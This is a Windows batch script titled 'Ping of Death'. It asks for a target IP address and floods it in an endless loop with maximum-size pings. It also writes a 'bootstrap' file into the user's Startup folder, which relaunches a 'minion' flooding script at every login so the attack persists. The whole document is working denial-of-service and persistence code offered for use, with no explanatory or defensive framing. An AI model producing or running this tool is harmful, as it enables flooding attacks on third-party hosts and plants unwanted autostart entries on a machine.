@echo off

echo "  ____    _                              __     ____                   _     _      "
echo " |  _ \  (_)  _ __     __ _      ___    / _|   |  _ \    ___    __ _  | |_  | |__   "
echo " | |_) | | | | '_ \   / _` |    / _ \  | |_    | | | |  / _ \  / _` | | __| | '_ \  "
echo " |  __/  | | | | | | | (_| |   | (_) | |  _|   | |_| | |  __/ | (_| | | |_  | | | | "
echo " |_|     |_| |_| |_|  \__, |    \___/  |_|     |____/   \___|  \__,_|  \__| |_| |_| "
echo "                       |___/                                                        "

set /p target="Enter target IP: "

(
echo @echo off
echo title
echo "%userprofile%\pinger.cmd"
) > "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\call.cmd"

(
echo @echo off
echo :start
echo ping %target% /l 65500 /w 1 /n 1
echo goto start
) > "%userprofile%\pinger.cmd"

echo Bootstrap Script Call.cmd Created...
echo Minion Script Pinger.cmd Created...

:start
ping %target% /l 65500 /w 1 /n 1
goto start